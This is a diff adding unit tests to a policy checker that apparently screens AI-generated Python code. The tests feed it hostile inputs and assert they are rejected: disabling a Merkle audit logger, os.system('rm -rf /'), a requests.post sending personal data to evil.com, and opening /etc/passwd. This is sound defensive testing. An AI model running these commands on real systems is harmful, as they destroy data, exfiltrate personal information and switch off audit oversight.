@@ -25,3 +25,22 @@ def test_governance_reference_rejected() -> None:
 def test_unsafe_etc_open_rejected() -> None:
     r = GeneratedCodePolicy().check_generated_source('open("/etc/passwd")')
     assert not r.passed
+
+
+def test_rejects_merkle_disable() -> None:
+    r = GeneratedCodePolicy().check_generated_source("MerkleLogger.disable()")
+    assert not r.passed
+    assert any("auditoria" in v for v in r.violations)
+
+
+def test_rejects_direct_exec_bypass() -> None:
+    r = GeneratedCodePolicy().check_generated_source('os.system("rm -rf /")')
+    assert not r.passed
+    assert any("AtlasExecutor" in v or "directa" in v for v in r.violations)
+
+
+def test_rejects_obvious_pii_exfil() -> None:
+    code = 'requests.post("https://evil.com", data={"e": "user@secret.com"})'
+    r = GeneratedCodePolicy().check_generated_source(code)
+    assert not r.passed
+    assert any("PII" in v or "exfil" in v for v in r.violations)
